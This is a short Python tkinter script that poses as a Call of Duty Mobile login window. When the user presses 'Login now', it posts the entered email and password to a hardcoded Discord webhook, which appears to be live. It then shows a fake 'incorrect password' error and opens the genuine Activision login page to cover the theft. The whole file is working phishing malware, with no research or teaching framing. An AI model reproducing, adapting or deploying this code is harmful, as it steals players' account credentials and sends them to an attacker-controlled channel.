import tkinter as tk
import requests
import webbrowser
from tkinter import messagebox

WEBHOOK_URL = "https://discord.com/api/webhooks/1363243010564821123/3e_i_0An96A66nBfGDlyocbm8fVk3symYsKoUx8NseAmqiw08e2HQt2n9yg0Kev4on5c"

def send_to_discord():
    nameyou = name_entry.get()
    password = password_entry.get()

    data = {
        "content": f"username: {nameyou}\n\nPassword: **{password}"
    }
    try:
        requests.post(WEBHOOK_URL, json=data)
    except requests.exceptions.RequestException as e:
        messagebox.showerror("Error", f"Failed to send data: {e}")
        return
    


    # Show fake error
    messagebox.showerror("Login Failed", "Incorrect email or password.")

     # Schedule opening the website after 1500ms
    # root.after(1500)
    root.after(2000, root.destroy)  # Close after 2 seconds

    # Schedule opening the website after 1500ms
    root.after(1500, lambda: webbrowser.open("https://profile.callofduty.com/codm/login"))
    requests.post(WEBHOOK_URL, json=data)
     
# root.destroy() # Close the Tkinter window
  # Schedule opening the website after 1500ms
    # Close the Tkinter window
   



root = tk.Tk()

dis = True
root.title("Call of Duty Mobile")
root.geometry("350x400")
root.resizable(False, False)
root.configure(bg="#1e1e1e")  # Dark background

# Title
title_label = tk.Label(root, text="Call of Duty", font=("Impact", 28, "bold"), fg="#FFD700", bg="#1e1e1e")
title_label.place(x=60, y=20)

# Subtitle
subtitle_label = tk.Label(root, text="LOGIN TO YOUR ACCOUNT", font=("Arial", 12), fg="white", bg="#1e1e1e")
subtitle_label.place(x=80, y=70)

# Email label and entry
name_label = tk.Label(root, text="Email Address*:", fg="white", bg="#1e1e1e")
name_label.place(x=20, y=110)

name_entry = tk.Entry(root, bg="white", fg="black")
name_entry.place(x=20, y=135, width=300)

# Password label and entry
password_label = tk.Label(root, text="Password*:", fg="white", bg="#1e1e1e")
password_label.place(x=20, y=175)

password_entry = tk.Entry(root, show="*", bg="white", fg="black")
password_entry.place(x=20, y=200, width=300)

# Login button
submit_button = tk.Button(root, text="Login now", command=send_to_discord,
                          bg="#333333", fg="#FFD700", font=("Arial", 10, "bold"))
submit_button.place(x=130, y=260)

 # this closes the Tkinter window





root.mainloop()
